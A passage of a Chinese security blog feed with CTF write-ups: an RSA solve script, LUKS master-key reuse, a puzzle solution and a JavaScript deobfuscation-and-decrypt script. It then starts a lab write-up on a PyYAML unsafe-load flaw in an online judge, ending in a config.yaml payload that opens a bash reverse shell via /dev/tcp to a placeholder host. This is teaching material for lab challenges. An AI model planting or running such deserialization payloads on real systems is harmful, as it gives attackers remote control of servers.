class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Getting p</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">power</span>(<span class="params">x, y, p</span>):</span><br><span class="line">    res = <span class="number">1</span>;  <span class="comment"># Initialize result</span></span><br><span class="line">    x = x % p;  <span class="comment"># Update x if it is more</span></span><br><span class="line">    <span class="comment"># than or equal to p</span></span><br><span class="line">    <span class="keyword">while</span> (y &gt; <span class="number">0</span>):</span><br><span class="line"></span><br><span class="line">        <span class="comment"># If y is odd, multiply</span></span><br><span class="line">        <span class="comment"># x with result</span></span><br><span class="line">        <span class="keyword">if</span> (y &amp; <span class="number">1</span>):</span><br><span class="line">            res = (res * x) % p;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># y must be even now</span></span><br><span class="line">        y = y &gt;&gt; <span class="number">1</span>;  <span class="comment"># y = y/2</span></span><br><span class="line">        x = (x * x) % p;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Function to find modular inverse</span></span><br><span class="line"><span class="comment"># of a under modulo p using Fermat&#x27;s</span></span><br><span class="line"><span class="comment"># method. Assumption: p is prime</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modInverse</span>(<span class="params">a, p</span>):</span><br><span class="line">    <span class="keyword">return</span> power(a, p - <span class="number">2</span>, p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Returns n! % p using</span></span><br><span class="line"><span class="comment"># Wilson&#x27;s Theorem</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modFact</span>(<span class="params">n, p</span>):</span><br><span class="line">    <span class="comment"># n! % p is 0 if n &gt;= p</span></span><br><span class="line">    <span class="keyword">if</span> (p &lt;= n):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Initialize result as (p-1)!</span></span><br><span class="line">    <span class="comment"># which is -1 or (p-1)</span></span><br><span class="line">    res = (p - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Multiply modulo inverse of</span></span><br><span class="line">    <span class="comment"># all numbers from (n+1) to p</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n + <span class="number">1</span>, p):</span><br><span class="line">        res = (res * modInverse(i, p)) % p</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_p</span>():</span><br><span class="line">    x = <span class="number">11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391760451</span></span><br><span class="line">    y = <span class="number">11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391661439</span></span><br><span class="line">    p = sympy.nextprime(modFact(y, x))</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Getting q</span></span><br><span class="line"><span class="comment"># 要定义这个运算，需要三个整数。a的模逆元素（对n取模）为b，意味着a*b mod m=1，则称a关于m的模逆为b</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">while</span> a != <span class="number">0</span>:</span><br><span class="line">        a, b = b % a, a</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个函数，参数分别为a,n，返回值为b</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">findModReverse</span>(<span class="params">a, m</span>):  <span class="comment"># 这个扩展欧几里得算法求模逆</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> gcd(a, m) != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    u1, u2, u3 = <span class="number">1</span>, <span class="number">0</span>, a</span><br><span class="line">    v1, v2, v3 = <span class="number">0</span>, <span class="number">1</span>, m</span><br><span class="line">    <span class="keyword">while</span> v3 != <span class="number">0</span>:</span><br><span class="line">        q = u3 // v3</span><br><span class="line">        v1, v2, v3, u1, u2, u3 = (u1 - q * v1), (u2 - q * v2), (u3 - q * v3), v1, v2, v3</span><br><span class="line">    <span class="keyword">return</span> u1 % m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_q</span>():</span><br><span class="line">    value = [<span class="number">80096058210213458444437404275177554701604739094679033012396452382975889905967</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">        value.append(sympy.prevprime(value[i - <span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Euler&#x27;s totient function</span></span><br><span class="line">    r = <span class="number">1</span></span><br><span class="line">    n = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        r = r * (value[i] - <span class="number">1</span>)</span><br><span class="line">        n = n * value[i]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Modular multiplicative inverse</span></span><br><span class="line">    d = findModReverse(e, r)</span><br><span class="line"></span><br><span class="line">    cipher_q = <span class="number">5591130088089053683141520294620171646179623062803708281023766040254675625012293743465254007970358536660934858789388093688621793201658889399155357407224541324547522479617669812322262372851929223461622559971534394847970366311206823328200747893961649255426063204482192349202005330622561575868946656570678176047822163692259375233925446556338917358118222905050574458037965803154233167594946713038301249145097770337253930655681648299249481985768272321820718607757023350742647019762122572886601905212830744868048802864679734428398229280780215896045509020793530842541217790352661324630048261329493088812057300480085895399922301827190211956061083460036781018660201163819104150988531352228650991733072010425499238731811243310625701946882701082178190402011133439065106720309788819</span></span><br><span class="line">    q = sympy.nextprime(<span class="built_in">pow</span>(cipher_q, d, n))</span><br><span class="line">    <span class="keyword">return</span> q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = get_p()</span><br><span class="line">q = get_q()</span><br><span class="line">n = p * q</span><br><span class="line">r = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">d = findModReverse(e, r)</span><br><span class="line">c = <span class="number">110644875422336073350488613774418819991169603750711465190260581119043921549811353108399064284589038384540018965816137286856268590507418636799746759551009749004176545414118128330198437101472882906564195341277423007542422286760940374859966152871273887950174522820162832774361714668826122465471705166574184367478</span></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">m = m.to_bytes(<span class="number">28</span>, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(m.decode())</span><br></pre></td></tr></table></figure><h2 id="加密的-U-盘"><a href="#加密的-U-盘" class="headerlink" title="加密的 U 盘"></a>加密的 U 盘</h2><p>题目给出两个U盘文件，一个是第一天的，已知密码挂载即可打开。一个是第二天的，说是设置了“随机生成的强密码”。这里打引号是因为我们根本不需要破解所谓的强密码。根据 <a href="https://en.wikipedia.org/wiki/Linux_Unified_Key_Setup">Linux Unified Key Setup - Wikipedia</a> 给出的外链参考 <a href="https://gitlab.com/cryptsetup/cryptsetup/-/wikis/FrequentlyAskedQuestions">FrequentlyAskedQuestions · Wiki · cryptsetup &#x2F; cryptsetup · GitLab</a> 写到：</p><blockquote><p>  CLONING&#x2F;IMAGING: If you clone or image a LUKS container, you make a copy of the LUKS header and the master key will stay the same!  That means that if you distribute an image to several machines, the same master key will be used on all of them, regardless of whether you change the passphrases.  Do NOT do this!  If you do, a root-user on any of the machines with a mapped (decrypted) container or a passphrase on that machine can decrypt all other copies, breaking security.  See also Item 6.15.</p></blockquote><p>通过 <a href="https://unix.stackexchange.com/questions/119803/how-to-decrypt-luks-with-the-known-master-key">How to decrypt LUKS with the known master key? - Unix &amp; Linux Stack Exchange</a> 的利用方法，导出第一天硬盘镜像的 <code>master-key</code> 文件，再用这个 <code>master-key</code> 去打开第二天的硬盘即可。</p><h2 id="赛博厨房"><a href="#赛博厨房" class="headerlink" title="赛博厨房"></a>赛博厨房</h2><p><strong>Level 0</strong></p><p>Level 0 甚至可以用来做签到题目，只需要基础的编程思想就可以按照指令一步步做出来，毕竟才两个材料。（没有特别多人做出来很可能是因为看到总分600分怕了，以为是一道题）</p><p><strong>Level 1</strong></p><p>有过指令集等相关知识的一看题目便知道这是使用循环，当不满足条件时向上跳转，直到满足条件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">向右 1 步</span><br><span class="line">拿起 100 个物品</span><br><span class="line">向左 1 步</span><br><span class="line">向下 1 步</span><br><span class="line">放下 1 个物品</span><br><span class="line">如果手上的物品大于等于 0 向上跳转 1 行</span><br></pre></td></tr></table></figure><h2 id="minecRaft"><a href="#minecRaft" class="headerlink" title="minecRaft"></a>minecRaft</h2><p>这题其实是披着web的皮，戴着crytpo手套的reverse狼。为什么这么说呢，打开web游戏的源代码，可以看到 JS 中打开所有三盏灯的关键部分是一个叫 <code>gyflagh()</code> 的函数。这个函数在 flag.js 里面，同样使用谷歌浏览器开发工具即可找到并以漂亮的代码格式整理好展示。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(cinput.<span class="property">length</span>&gt;=<span class="number">32</span>)&#123;</span><br><span class="line"><span class="keyword">let</span> tbool=<span class="title function_">gyflagh</span>(cinput.<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>));</span><br><span class="line"><span class="keyword">if</span>(tbool) &#123;</span><br><span class="line">pressplateList[<span class="number">65</span>].<span class="title class_">TurnOn</span>_redstone_lamp();</span><br><span class="line">content.<span class="property">innerText</span>=<span class="string">&#x27;Congratulations!!!&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">cinput.<span class="property">length</span>=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是，flag.js 的代码是过了混淆的，根据格式来看很可能是 javascript-obfuscator 混淆后生成的代码，多创建了一个字典函数，所有函数执行都是先通过字典函数还原之后再执行。通过 <a href="http://jsnice.org/">JS NICE: Statistical renaming, Type inference and Deobfuscation</a> 能够一定程度上缓解混淆。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">_0x381b</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> _0x4af9ee = [<span class="string">&quot;encrypt&quot;</span>, <span class="string">&quot;33MGcQht&quot;</span>, <span class="string">&quot;6fbde674819a59bfa12092565b4ca2a7a11dc670c678681daf4afb6704b82f0c&quot;</span>, <span class="string">&quot;14021KbbewD&quot;</span>, <span class="string">&quot;charCodeAt&quot;</span>, <span class="string">&quot;808heYYJt&quot;</span>, <span class="string">&quot;5DlyrGX&quot;</span>, <span class="string">&quot;552oZzIQH&quot;</span>, <span class="string">&quot;fromCharCode&quot;</span>, <span class="string">&quot;356IjESGA&quot;</span>, <span class="string">&quot;784713mdLTBv&quot;</span>, <span class="string">&quot;2529060PvKScd&quot;</span>, <span class="string">&quot;805548mjjthm&quot;</span>, <span class="string">&quot;844848vFCypf&quot;</span>, <span class="string">&quot;4bIkkcJ&quot;</span>, <span class="string">&quot;1356853149054377&quot;</span>, <span class="string">&quot;length&quot;</span>, <span class="string">&quot;slice&quot;</span>, <span class="string">&quot;1720848ZSQDkr&quot;</span>];</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@return</span> &#123;<span class="type">?</span>&#125;</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  _0x381b = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> _0x4af9ee;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">_0x381b</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">_0x2c9e</span>(<span class="params">_0x49e6ff, _0x310d40</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> _0x381b4c = <span class="title function_">_0x381b</span>();</span><br><span class="line">    <span class="keyword">return</span> _0x2c9e = <span class="keyword">function</span>(<span class="params">_0x2c9ec6, _0x2ec3bd</span>) &#123;</span><br><span class="line">        _0x2c9ec6 = _0x2c9ec6 - <span class="number">0x1a6</span>;</span><br><span class="line">        <span class="keyword">let</span> _0x4769df = _0x381b4c[_0x2c9ec6];</span><br><span class="line">        <span class="keyword">return</span> _0x4769df;</span><br><span class="line">    &#125;</span><br><span class="line">    ,</span><br><span class="line">    <span class="title function_">_0x2c9e</span>(_0x49e6ff, _0x310d40);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>细读代码之后可以发现，关键的加密代码是这个，并且通过谷歌浏览器调试也可以发现这个函数名是 encrypt。使用方式为 <code>String&lt;type&gt;.encrypt(seed)</code> 。而encrypted函数中关键的函数就是 <code>code()</code> 这个才是主要的加密功能的函数。反混淆之后的 <code>code()</code> 函数如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">code</span>(<span class="params">p, q</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> time = <span class="number">2654435769</span>;</span><br><span class="line">  <span class="keyword">const</span> constrain = time * <span class="number">32</span>;</span><br><span class="line">  <span class="keyword">let</span> i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (i != constrain;) &#123;</span><br><span class="line">    p[<span class="number">0</span>] = p[<span class="number">0</span>] + ((p[<span class="number">1</span>] &lt;&lt; <span class="number">4</span> ^ p[<span class="number">1</span>] &gt;&gt;&gt; <span class="number">5</span>) + p[<span class="number">1</span>] ^ i + q[i &amp; <span class="number">3</span>]);</span><br><span class="line">    i = i + time;</span><br><span class="line">    p[<span class="number">1</span>] = p[<span class="number">1</span>] + ((p[<span class="number">0</span>] &lt;&lt; <span class="number">4</span> ^ p[<span class="number">0</span>] &gt;&gt;&gt; <span class="number">5</span>) + p[<span class="number">0</span>] ^ i + q[i &gt;&gt;&gt; <span class="number">11</span> &amp; <span class="number">3</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  p[<span class="number">0</span>] = p[<span class="number">0</span>];</span><br><span class="line">  p[<span class="number">1</span>] = p[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这个过程很像一个对称式加密，其中密钥的部分是恒定的，可以通过调试手段从混淆函数中找到，因此非常容易反解出来，以此为依据撰写他的解密函数 <code>decode()</code> ，函数如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">decode</span>(<span class="params">p, q</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> time = <span class="number">2654435769</span>;</span><br><span class="line">  <span class="keyword">const</span> constrain = time * <span class="number">32</span>;</span><br><span class="line">  <span class="keyword">let</span> i = constrain;</span><br><span class="line">  <span class="keyword">while</span> (i != <span class="number">0</span>) &#123;</span><br><span class="line">    p[<span class="number">1</span>] = p[<span class="number">1</span>] - ((p[<span class="number">0</span>] &lt;&lt; <span class="number">4</span> ^ p[<span class="number">0</span>] &gt;&gt;&gt; <span class="number">5</span>) + p[<span class="number">0</span>] ^ i + q[i &gt;&gt;&gt; <span class="number">11</span> &amp; <span class="number">3</span>]);</span><br><span class="line">    i = i - time;</span><br><span class="line">    p[<span class="number">0</span>] = p[<span class="number">0</span>] - ((p[<span class="number">1</span>] &lt;&lt; <span class="number">4</span> ^ p[<span class="number">1</span>] &gt;&gt;&gt; <span class="number">5</span>) + p[<span class="number">1</span>] ^ i + q[i &amp; <span class="number">3</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  p[<span class="number">0</span>] = p[<span class="number">0</span>];</span><br><span class="line">  p[<span class="number">1</span>] = p[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样的，逆向分解加密后的一长串字符串，并逐一解密即可，完整EXP代码如下，此代码可以直接放到浏览器调试窗口运行即可。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cipher = <span class="string">&#x27;6fbde674819a59bfa12092565b4ca2a7a11dc670c678681daf4afb6704b82f0c&#x27;</span>;</span><br><span class="line">seed = <span class="string">&#x27;1356853149054377&#x27;</span>;</span><br><span class="line">output = <span class="string">&#x27;flag&#123;&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">    q[i] = <span class="title class_">Str4ToLong</span>(seed.<span class="title function_">slice</span>(i * <span class="number">4</span>, (i + <span class="number">1</span>) * <span class="number">4</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; cipher.<span class="property">length</span>; i = i + <span class="number">16</span>) &#123;</span><br><span class="line">    p[<span class="number">0</span>] = <span class="title class_">Base16ToLong</span>(cipher.<span class="title function_">slice</span>(i, i + <span class="number">8</span>));</span><br><span class="line">    p[<span class="number">1</span>] = <span class="title class_">Base16ToLong</span>(cipher.<span class="title function_">slice</span>(i + <span class="number">8</span>, i + <span class="number">16</span>));</span><br><span class="line">    <span class="title function_">decode</span>(p, q);</span><br><span class="line">    output = output + <span class="title class_">LongToStr4</span>(p[<span class="number">0</span>]) + <span class="title class_">LongToStr4</span>(p[<span class="number">1</span>]);</span><br><span class="line">    p = [];</span><br><span class="line">&#125;</span><br><span class="line">output = output + <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(output);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> USTC Hackgame </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tencent Spark Program 2021</title>
      <link href="/2021/08/19/Tencent-Spark-Program-2021/"/>
      <url>/2021/08/19/Tencent-Spark-Program-2021/</url>
      
        <content type="html"><![CDATA[<p>引言：如今，几乎所有的智能产品或多或少都离不开计算机的发展，计算机安全也渗入进生活的方方面面，大到网站Web服务器，小到手机App和家用路由器。挑战周的挑战项目由Web安全开始，逐渐向二进制安全，逆向安全推进。</p><p><a data-fancybox="gallery" data-src="/2021/08/19/Tencent-Spark-Program-2021/assets/20a77740fa52aabce522ac90e71e886.jpg" data-caption="20a77740fa52aabce522ac90e71e886"><img src="/2021/08/19/Tencent-Spark-Program-2021/assets/20a77740fa52aabce522ac90e71e886.jpg" alt="20a77740fa52aabce522ac90e71e886"></a></p><p>声明：挑战周内使用的Web组件和评测机组件均来自开源OJ (Online Judge)组件：<a href="https://github.com/vijos/vj4">Vijos&#x2F;vj4</a>, <a href="https://github.com/vijos/jd4">Vijos&#x2F;jd4</a>。原组件经过多次迭代没有漏洞产生，导师通过修改jd4的源代码暴露漏洞供挑战周使用。漏洞复现所使用的安卓Chrome漏洞和路由器固件漏洞 (<a href="https://nvd.nist.gov/vuln/detail/CVE-2018-8879">CVE-2018-8879</a>) 厂商均已修复，请及时更新App或固件。</p><p>如对文档有任何疑问，请联系E-mail：<a href="mailto:&#84;&#x68;&#x6f;&#109;&#x61;&#x73;&#111;&#110;&#90;&#104;&#97;&#x6f;&#64;&#113;&#113;&#46;&#99;&#111;&#x6d;">&#84;&#x68;&#x6f;&#109;&#x61;&#x73;&#111;&#110;&#90;&#104;&#97;&#x6f;&#64;&#113;&#113;&#46;&#99;&#111;&#x6d;</a></p><h2 id="Vijos-OJ评测机之yaml反序列化"><a href="#Vijos-OJ评测机之yaml反序列化" class="headerlink" title="Vijos OJ评测机之yaml反序列化"></a>Vijos OJ评测机之yaml反序列化</h2><p>挑战背景：VIJOS是一个安全的OJ系统。这可能主要得益于开发者也是CTF选手。</p><p><a data-fancybox="gallery" data-src="/2021/08/19/Tencent-Spark-Program-2021/assets/clip_image002.jpg" data-caption="img"><img src="/2021/08/19/Tencent-Spark-Program-2021/assets/clip_image002.jpg" alt="img"></a></p><p>不过，并不是所有OJ的开发者都了解安全技术。本题目使用的VIJOS就是一个不懂安全的开发者开发的，他在开发过程中犯了一个很小安全错误，然而，这个安全错误却导致OJ被完全攻陷，你能找到这个安全错误，并利用它攻陷OJ吗？</p><p>代码审计：使用 <code>git stutus</code> 和 <code>git diff</code> 查看相关代码更改，发现只更改了一行代码，从使用 <code>safe_load()</code> 函数更改为 <code>load()</code>。</p><blockquote><p>  <code>yaml.load</code> accepts a byte string, a Unicode string, an open binary file object, or an open text file object. A byte string or a file must be encoded with <em>utf-8</em>, <em>utf-16-be</em> or <em>utf-16-le</em> encoding. <code>yaml.load</code> detects the encoding by checking the <em>BOM</em> (byte order mark) sequence at the beginning of the string&#x2F;file. If no <em>BOM</em> is present, the <em>utf-8</em> encoding is assumed.</p><p>  <code>yaml.load</code> returns a Python object.</p><p>  Note that the ability to construct an arbitrary Python object may be dangerous if you receive a YAML document from an untrusted source such as the Internet. The function <code>yaml.safe_load</code> limits this ability to simple Python objects like integers or lists.</p></blockquote><p><a data-fancybox="gallery" data-src="/2021/08/19/Tencent-Spark-Program-2021/assets/image-20210813141927044.png" data-caption="image-20210813141927044"><img src="/2021/08/19/Tencent-Spark-Program-2021/assets/image-20210813141927044.png" alt="image-20210813141927044"></a></p><p>漏洞详情：此处产生的是Pyyaml反序列化漏洞 (<a href="https://thej0lt.com/2020/06/21/cve-2019-20477-0day-yaml-deserialization-attack-on-pyyaml-version/#:~:text=%5BCVE-2019-20477%5D-%200Day%20YAML%20Deserialization%20Attack%20on%20PyYAML%20version,...%206%20YAML%20Deserialization%207%20YAML%20Deserialization.%20">CVE-2019-20477</a>) 。根据反序列化原理编写payload，追加到作为测试数据的文件压缩包内。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Payload</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (os.system,(<span class="string">&#x27;ls&#x27;</span>,))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">serialized_data = yaml.dump(Payload())  <span class="comment"># serializing data</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(serialized_data)</span><br><span class="line">---------------------------------------</span><br><span class="line">!!python/<span class="built_in">object</span>/apply:nt.system [ls]</span><br></pre></td></tr></table></figure><p><code>config.yaml</code> payload文件：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">default:</span> <span class="meta">&amp;default</span></span><br><span class="line">  <span class="attr">time:</span> <span class="string">1s</span></span><br><span class="line">  <span class="attr">memory:</span> <span class="string">32m</span></span><br><span class="line">  <span class="attr">score:</span> <span class="number">10</span></span><br><span class="line"><span class="attr">cases:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">&lt;&lt;:</span> <span class="meta">*default</span></span><br><span class="line">  <span class="attr">input:</span> <span class="string">case0.in</span></span><br><span class="line">  <span class="attr">output:</span> <span class="string">case0.out</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">&lt;&lt;:</span> <span class="meta">*default</span></span><br><span class="line">  <span class="attr">input:</span> <span class="string">case1.in</span></span><br><span class="line">  <span class="attr">output:</span> <span class="string">case1.out</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">&lt;&lt;:</span> <span class="meta">*default</span></span><br><span class="line">  <span class="attr">input:</span> <span class="string">case2.in</span></span><br><span class="line">  <span class="attr">output:</span> <span class="string">case2.out</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">&lt;&lt;:</span> <span class="meta">*default</span></span><br><span class="line">  <span class="attr">input:</span> <span class="string">case3.in</span></span><br><span class="line">  <span class="attr">output:</span> <span class="string">case3.out</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">&lt;&lt;:</span> <span class="meta">*default</span></span><br><span class="line">  <span class="attr">input:</span> <span class="string">case4.in</span></span><br><span class="line">  <span class="attr">output:</span> <span class="string">case4.out</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">&lt;&lt;:</span> <span class="meta">*default</span></span><br><span class="line">  <span class="attr">input:</span> <span class="string">case5.in</span></span><br><span class="line">  <span class="attr">output:</span> <span class="string">case5.out</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">&lt;&lt;:</span> <span class="meta">*default</span></span><br><span class="line">  <span class="attr">input:</span> <span class="string">case6.in</span></span><br><span class="line">  <span class="attr">output:</span> <span class="string">case6.out</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">&lt;&lt;:</span> <span class="meta">*default</span></span><br><span class="line">  <span class="attr">input:</span> <span class="string">case7.in</span></span><br><span class="line">  <span class="attr">output:</span> <span class="string">case7.out</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">&lt;&lt;:</span> <span class="meta">*default</span></span><br><span class="line">  <span class="attr">input:</span> <span class="string">case8.in</span></span><br><span class="line">  <span class="attr">output:</span> <span class="string">case8.out</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">&lt;&lt;:</span> <span class="meta">*default</span></span><br><span class="line">  <span class="attr">input:</span> <span class="string">case9.in</span></span><br><span class="line">  <span class="attr">output:</span> <span class="string">case9.out</span></span><br><span class="line"></span><br><span class="line"><span class="attr">m:</span> <span class="type">!!python/object/new:os.system</span> [<span class="string">&quot;/bin/bash -c &#x27;/bin/bash -i &gt;&amp; /dev/tcp/[ip]/[port] 